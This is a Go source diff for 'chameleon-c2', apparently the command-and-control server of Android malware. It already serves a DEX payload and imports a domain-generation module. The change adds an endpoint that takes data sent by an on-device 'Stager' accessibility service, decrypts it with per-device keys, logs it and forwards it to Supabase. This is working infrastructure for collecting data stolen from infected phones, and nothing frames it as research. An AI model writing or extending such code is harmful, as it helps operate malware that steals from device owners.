@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"github.com/gorilla/websocket"
+	"github.com/your-org/chameleon-c2/internal/crypto"
 	"github.com/your-org/chameleon-c2/internal/db"
 	"github.com/your-org/chameleon-c2/internal/dga"
 	"github.com/your-org/chameleon-c2/internal/supabase"
@@ -83,6 +84,9 @@ func (s *Server) Start() error {
 
 	// Payload DEX download
 	mux.HandleFunc("/api/payload", s.handlePayloadDownload)
+
+	// HTTP data ingestion (for Stager's accessibility service POST)
+	mux.HandleFunc("/api/ingest", s.handleDataIngest)
 
 	// Dashboard
 	mux.HandleFunc("/", s.handleDashboard)
@@ -282,6 +286,62 @@ func (s *Server) handlePayloadDownload(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Disposition", "attachment; filename=\"payload.dex\"")
 	http.ServeFile(w, r, absPath)
 	log.Printf("payload DEX served to %s", r.RemoteAddr)
+}
+
+func (s *Server) handleDataIngest(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != "POST" {
+		http.Error(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		Type      string `json:"type"`
+		DeviceID  string `json:"device_id"`
+		DataType  string `json:"data_type"`
+		Data      string `json:"data"`
+		Timestamp int64  `json:"timestamp"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		http.Error(w, "invalid request", 400)
+		return
+	}
+
+	if body.DeviceID == "" || body.DataType == "" || body.Data == "" {
+		http.Error(w, "device_id, data_type, and data required", 400)
+		return
+	}
+
+	// Decrypt the payload using the same key derivation as WS handler
+	masterSecret := s.config.MasterSecret
+	key := crypto.DeriveKey(body.DeviceID, masterSecret)
+	plaintext, err := crypto.Decrypt(body.Data, key)
+	if err != nil {
+		// If decryption fails (e.g. plain base64 fallback), use data as-is
+		plaintext = []byte(body.Data)
+		log.Printf("ingest decrypt failed (using raw): %v", err)
+	}
+
+	// Log receipt
+	summary := string(plaintext)
+	if len(summary) > 100 {
+		summary = summary[:100]
+	}
+	if err := s.db.LogDataReceived(body.DeviceID, body.DataType, summary); err != nil {
+		log.Printf("failed to log ingest data: %v", err)
+	}
+
+	// Forward to Supabase
+	if s.supabase != nil {
+		if err := s.supabase.ForwardData(body.DataType, body.DeviceID, plaintext); err != nil {
+			log.Printf("supabase forward failed for ingest: %v", err)
+		}
+	}
+
+	log.Printf("ingest data from %s type=%s size=%d", body.DeviceID, body.DataType, len(plaintext))
+	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
 }
 
 func (s *Server) periodicTasks() {
